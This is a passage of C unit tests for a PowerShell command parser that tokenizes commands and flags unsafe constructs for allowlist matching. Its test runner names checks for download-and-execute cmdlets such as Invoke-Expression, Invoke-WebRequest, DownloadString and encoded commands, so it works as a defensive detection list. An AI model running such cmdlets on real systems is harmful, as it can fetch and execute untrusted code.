void test_ps_here_string_single_quote(void) {
    /* Single-quoted here-string @'...'@ - should be flagged as unsafe due to complexity */
    ParsedShellCommand *cmd = parse_shell_command_for_type("$text = @'\nline1\nline2\n'@", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    /* Should be unsafe for matching due to $ and complex structure */
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_here_string_double_quote(void) {
    /* Double-quoted here-string @"..."@ - should be flagged as unsafe */
    ParsedShellCommand *cmd = parse_shell_command_for_type("$text = @\"\nHello $name\n\"@", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    /* Should be unsafe for matching due to $ */
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_nested_quotes_double_single(void) {
    /* Double quotes containing single quotes */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"value with 'single' inside\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Write-Output", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("value with 'single' inside", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

void test_ps_nested_quotes_single_double(void) {
    /* Single quotes containing double quotes */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output 'value with \"double\" inside'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Write-Output", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("value with \"double\" inside", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Command Equivalence Tests
 * ========================================================================== */

void test_ps_command_equivalence_ls_gci(void) {
    /* ls (POSIX) should be equivalent to Get-ChildItem (PowerShell) */
    TEST_ASSERT_EQUAL_INT(1, commands_are_equivalent("ls", "Get-ChildItem"));
}

void test_ps_command_equivalence_cat_gc(void) {
    /* cat (POSIX) should be equivalent to Get-Content (PowerShell) */
    TEST_ASSERT_EQUAL_INT(1, commands_are_equivalent("cat", "Get-Content"));
}

void test_ps_command_equivalence_gci_alias(void) {
    /* gci is alias for Get-ChildItem */
    TEST_ASSERT_EQUAL_INT(1, commands_are_equivalent("gci", "Get-ChildItem"));
}

void test_ps_command_equivalence_gc_alias(void) {
    /* gc is alias for Get-Content */
    TEST_ASSERT_EQUAL_INT(1, commands_are_equivalent("gc", "Get-Content"));
}

/* ============================================================================
 * Test Runner
 * ========================================================================== */

int main(void) {
    UNITY_BEGIN();

    /* Basic Tokenization */
    RUN_TEST(test_ps_parse_simple_command);
    RUN_TEST(test_ps_parse_command_with_arguments);
    RUN_TEST(test_ps_parse_empty_command);
    RUN_TEST(test_ps_parse_null_command);
    RUN_TEST(test_ps_parse_multiple_spaces);

    /* Double Quote Handling */
    RUN_TEST(test_ps_double_quoted_argument);
    RUN_TEST(test_ps_double_quoted_with_path);
    RUN_TEST(test_ps_double_quoted_with_variable_flagged);
    RUN_TEST(test_ps_empty_double_quotes);

    /* Single Quote Handling */
    RUN_TEST(test_ps_single_quoted_argument);
    RUN_TEST(test_ps_single_quoted_no_variable_expansion);
    RUN_TEST(test_ps_single_quoted_preserves_special_chars);
    RUN_TEST(test_ps_empty_single_quotes);

    /* Semicolon Chain Detection */
    RUN_TEST(test_ps_semicolon_chain_detected);
    RUN_TEST(test_ps_semicolon_quoted_not_chain);

    /* Pipeline Chain Operators (PS 7+) */
    RUN_TEST(test_ps_double_ampersand_chain_detected);
    RUN_TEST(test_ps_double_pipe_chain_detected);

    /* Pipe Detection */
    RUN_TEST(test_ps_pipe_detected);
    RUN_TEST(test_ps_pipe_quoted_not_detected);

    /* Redirect Detection */
    RUN_TEST(test_ps_redirect_output_detected);
    RUN_TEST(test_ps_redirect_append_detected);
    RUN_TEST(test_ps_redirect_input_detected);
    RUN_TEST(test_ps_redirect_quoted_not_detected);

    /* Variable and Subexpression Detection */
    RUN_TEST(test_ps_variable_detected);
    RUN_TEST(test_ps_subexpression_detected);
    RUN_TEST(test_ps_variable_in_single_quotes_not_detected);

    /* Script Block Detection */
    RUN_TEST(test_ps_script_block_detected);
    RUN_TEST(test_ps_script_block_in_where_object);
    RUN_TEST(test_ps_script_block_quoted_not_detected);

    /* Call Operator Detection */
    RUN_TEST(test_ps_call_operator_detected);
    RUN_TEST(test_ps_call_operator_with_variable);

    /* Dot-Source Operator Detection */
    RUN_TEST(test_ps_dot_source_detected);
    RUN_TEST(test_ps_dot_in_path_not_dot_source);

    /* Backtick Escape Detection */
    RUN_TEST(test_ps_backtick_escape_detected);
    RUN_TEST(test_ps_backtick_in_double_quotes_handled);
    RUN_TEST(test_ps_backtick_in_single_quotes_literal);

    /* Unbalanced Quotes */
    RUN_TEST(test_ps_unbalanced_double_quotes_flagged);
    RUN_TEST(test_ps_unbalanced_single_quotes_flagged);

    /* Dangerous Cmdlets */
    RUN_TEST(test_ps_invoke_expression_dangerous);
    RUN_TEST(test_ps_invoke_expression_case_insensitive);
    RUN_TEST(test_ps_iex_alias_dangerous);
    RUN_TEST(test_ps_invoke_command_dangerous);
    RUN_TEST(test_ps_icm_alias_dangerous);
    RUN_TEST(test_ps_start_process_dangerous);
    RUN_TEST(test_ps_invoke_webrequest_dangerous);
    RUN_TEST(test_ps_iwr_alias_dangerous);
    RUN_TEST(test_ps_invoke_restmethod_dangerous);
    RUN_TEST(test_ps_irm_alias_dangerous);
    RUN_TEST(test_ps_encoded_command_dangerous);
    RUN_TEST(test_ps_enc_short_form_dangerous);
    RUN_TEST(test_ps_downloadstring_dangerous);
    RUN_TEST(test_ps_downloadfile_dangerous);
    RUN_TEST(test_ps_safe_command_not_dangerous);
    RUN_TEST(test_ps_get_content_not_dangerous);

    /* Allowlist Matching */
    RUN_TEST(test_ps_simple_match);
    RUN_TEST(test_ps_prefix_match);
    RUN_TEST(test_ps_no_match_with_chain);
    RUN_TEST(test_ps_no_match_with_pipe);
    RUN_TEST(test_ps_no_match_with_variable);
    RUN_TEST(test_ps_no_match_with_script_block);

    /* Safety Check */
    RUN_TEST(test_ps_safe_simple_command);
    RUN_TEST(test_ps_not_safe_with_chain);
    RUN_TEST(test_ps_not_safe_with_variable);
    RUN_TEST(test_ps_not_safe_with_backtick);
    RUN_TEST(test_ps_not_safe_with_call_operator);

    /* Utility Functions */
    RUN_TEST(test_ps_get_base_command);
    RUN_TEST(test_ps_copy_command);

    /* Edge Cases */
    RUN_TEST(test_ps_whitespace_only);
    RUN_TEST(test_ps_path_with_backslashes);
    RUN_TEST(test_ps_quoted_path_with_spaces);
    RUN_TEST(test_ps_mixed_quote_types);
    RUN_TEST(test_ps_cmdlet_with_hyphen);
    RUN_TEST(test_ps_array_notation);
    RUN_TEST(test_ps_hashtable_notation);
    RUN_TEST(test_ps_here_string_single_quote);
    RUN_TEST(test_ps_here_string_double_quote);
    RUN_TEST(test_ps_nested_quotes_double_single);
    RUN_TEST(test_ps_nested_quotes_single_double);

    /* Command Equivalence */
    RUN_TEST(test_ps_command_equivalence_ls_gci);
    RUN_TEST(test_ps_command_equivalence_cat_gc);
    RUN_TEST(test_ps_command_equivalence_gci_alias);
    RUN_TEST(test_ps_command_equivalence_gc_alias);

    return UNITY_END();
}
